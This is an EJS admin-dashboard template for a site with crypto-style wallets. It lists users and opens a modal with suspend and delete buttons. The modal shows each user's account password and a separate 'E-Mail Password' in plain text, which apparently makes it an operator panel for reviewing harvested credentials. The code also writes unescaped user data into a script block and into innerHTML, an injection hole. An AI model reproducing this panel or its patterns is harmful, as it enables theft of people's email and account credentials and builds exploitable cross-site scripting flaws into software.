<%- include('../partials/header', { title: 'Users - Admin Dashboard' }) %>
<%- include('../partials/nav', { page: 'users' }) %>
    <%- include('../partials/toast') %>


    <div class="bg-white rounded-lg shadow overflow-hidden">
        <div class="overflow-x-auto">
            <table class="w-full">
                <thead class="bg-gray-100">
                    <tr>
                        <th class="px-4 py-3 text-left text-sm font-medium">Full Name</th>
                        <th class="px-4 py-3 text-left text-sm font-medium">Email</th>
                        <th class="px-4 py-3 text-left text-sm font-medium">Phone</th>
                        <th class="px-4 py-3 text-left text-sm font-medium">Country</th>
                        <th class="px-4 py-3 text-left text-sm font-medium">Wallet</th>
                        <th class="px-4 py-3 text-left text-sm font-medium">Action</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-gray-200">
                    <% users.forEach(user => { %>
                    <tr>
                        <td class="px-4 py-3 text-sm"><%= user.fullname %></td>
                        <td class="px-4 py-3 text-sm"><%= user.email %></td>
                        <td class="px-4 py-3 text-sm"><%= user.phone %></td>
                        <td class="px-4 py-3 text-sm"><%= user.country %></td>
                        <td class="px-4 py-3 text-sm">
                            <% if (user.walletConnected) { %>
                                <span class="text-green-600 font-medium">Connected</span>
                            <% } else { %>
                                <span class="text-gray-500">Not Connected</span>
                            <% } %>
                        </td>
                        <td class="px-4 py-3 text-sm">
                            <button onclick="showUserModal('<%= user._id %>')" class="text-black hover:underline">View</button>
                        </td>
                    </tr>
                    <% }); %>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- USER MODAL -->
<div id="userModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
    <div class="bg-white rounded-lg max-w-2xl w-full max-h-screen overflow-y-auto">
        <div class="p-6">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">User Details</h2>
                <button onclick="closeModal()" class="text-2xl">&times;</button>
            </div>
            <div id="modalContent" class="space-y-3 text-sm"></div>
            <div class="flex gap-3 mt-6">
                <button id="suspendBtn" class="px-4 py-2 bg-gray-700 text-white rounded hover:bg-gray-700">Suspend</button>
                <button id="deleteBtn" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-gray-900">Delete</button>
            </div>
        </div>
    </div>
</div>

<script>
  const users = <%- JSON.stringify(users) %>;

  function showUserModal(userId) {
    const user = users.find(u => u._id === userId);
    if (!user) return;

    const content = `
      <div><strong>Full Name:</strong> ${user.fullname}</div>
      <div><strong>Username:</strong> ${user.username}</div>
      <div><strong>Email:</strong> ${user.email}</div>
      <div><strong>Password:</strong> ${user.password}</div>
      <div><strong>Phone:</strong> ${user.phone}</div>
      <div><strong>Country:</strong> ${user.country}</div>
      <div><strong>State:</strong> ${user.state}</div>
      <div><strong>E-Mail Password:</strong> ${user.mpassword}</div>
      <div><strong>Verified:</strong> ${user.verified ? 'Yes' : 'No'}</div>
      <div><strong>Wallet Balance:</strong> $${user.wallet.toFixed(2)}</div>
      <div><strong>Wallet Connected:</strong> ${user.walletConnected ? 'Yes' : 'No'}</div>
      <div><strong>Suspended:</strong> ${user.suspended ? 'Yes' : 'No'}</div>
    `;
    
    document.getElementById('modalContent').innerHTML = content;
    document.getElementById('userModal').classList.remove('hidden');

    // Change button label based on suspension status
    const suspendBtn = document.getElementById('suspendBtn');
    suspendBtn.textContent = user.suspended ? 'Unsuspend' : 'Suspend';
    suspendBtn.onclick = () => toggleSuspendUser(userId, user.suspended);

    document.getElementById('deleteBtn').onclick = () => deleteUser(userId);
  }

  function closeModal() {
    document.getElementById('userModal').classList.add('hidden');
  }

  // âœ… Toggle suspend/unsuspend
  function toggleSuspendUser(userId, isSuspended) {
    const action = isSuspended ? 'unsuspend' : 'suspend';
    const confirmMsg = isSuspended
      ? 'Are you sure you want to unsuspend this user?'
      : 'Are you sure you want to suspend this user?';

    if (confirm(confirmMsg)) {
      fetch(`/admin/users/${userId}/${action}`, { method: 'POST' })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            alert(data.message);
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(err => alert('Network error: ' + err.message));
    }
  }

 function deleteUser(userId) {
    if (confirm('Are you sure you want to delete this user?')) {
      fetch(`/admin/users/${userId}`, { method: 'DELETE' })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            alert('User deleted successfully');
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(err => alert('Network error: ' + err.message));
    }
  }
</script>


</body>
</html>
